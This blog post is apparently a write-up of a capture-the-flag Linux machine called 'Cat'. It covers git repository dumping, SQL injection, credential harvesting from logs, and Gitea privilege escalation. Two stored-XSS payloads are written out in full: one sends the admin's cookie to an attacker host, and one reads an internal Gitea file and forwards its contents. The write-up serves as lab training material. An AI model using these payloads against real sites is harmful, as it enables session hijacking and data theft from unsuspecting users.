---
layout: post
title: "Cat-Linux-Medium"
date:   2025-07-17 12:05:57 -0400
categories: writeups
thumb: /assets/images/logos/bf7ae27f4e0ce1703bdd10d538334d9e.webp
---

# Cat

# 1. Enumeration

Start enumerating ports, only two are opened

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image.png' | relative_url }})

Check web application running on it

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_1.png' | relative_url }})

We could self-register a new account

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_2.png' | relative_url }})

And we are able to upload a cat info

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_3.png' | relative_url }})

To have a deeper knowledge about this site, we could perform a fuzzing searching for directories or php files 

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_4.png' | relative_url }})

Nothing interesting in the previous dictionary try with another one

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_5.png' | relative_url }})

Effectively there is a repository behind it

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_6.png' | relative_url }})

Use git dumper for extract files in this project

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_7.png' | relative_url }})

Now we can check the backend to find vulnerabilities

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_8.png' | relative_url }})

In admin.php an admin username is disclosed

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_9.png' | relative_url }})

By the way, username field is not sanitized in here

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_10.png' | relative_url }})

The cat name parameter is used in a sql query as it is send by the user

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_11.png' | relative_url }})

Here we can build two potential vector attacks, a XSS in the username that could steal the cookie of the admin when the registered users are requested, and a SQL injection in the accept cat endpoint, which is available only as admin

# 2. User flag

So, first set a xss payload to obtain admin flag, by now just put payload in the username field

```bash
<script src=x onerror=this.src="http://ip:port/?c="+encodeURIComponent(document.cookie)></script>
```

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_12.png' | relative_url }})

Now register a new cat with that account, thatâ€™s how the admin could load the payload name

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_13.png' | relative_url }})

Get admin cookie

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_14.png' | relative_url }})

A new endpoint is available here

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_15.png' | relative_url }})

As we saw before accept_cat endpoint has sql injection, we can use sqlmap here, note that the admin cookie is needed here

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_16.png' | relative_url }})

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_17.png' | relative_url }})

rosa hash is crackeable

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_18.png' | relative_url }})

Get access through ssh 

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_19.png' | relative_url }})

Looking around we have access to logs, sometimes those files do not encrypt data

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_20.png' | relative_url }})

Effectively we have axel password disclosed

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_21.png' | relative_url }})

User flag was there!!

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_22.png' | relative_url }})

# 3.Priv esc

The last step give us a clue about a possible privilege escalation attack, we have a mail where it is being persistent in a new management system on port 3000

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_23.png' | relative_url }})

That port is open here

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_24.png' | relative_url }})

Forward those ports to see what is going on

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_25.png' | relative_url }})

Gitea is being used to this purpose

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_26.png' | relative_url }})

As a first steps check versions, this seems to be an oldie one because right now they are on 1.23 version

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_27.png' | relative_url }})

This vulnerability consist in a stored xss where someone could leverage description field in a repo to plant a javascript payload trying to retrieve the content of /administrator/Employee-management/raw/branch/main/index.php which has important information about the administrator which according to the mail seems to be jorbert

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_28.png' | relative_url }})

Prepare the payload

```bash
<a href="javascript.fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://ip:port/?content='+encodeURIComponent(data)))">hahaha</a>
```

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_29.png' | relative_url }})

This is our malicious repo

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_30.png' | relative_url }})

Now send an email to jobert as it is said in the mail

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_31.png' | relative_url }})

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_32.png' | relative_url }})

wait a little bit to obtain root password

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_33.png' | relative_url }})

![image.png]({{ '/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_34.png' | relative_url }})

Machine pwned!!!

<script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
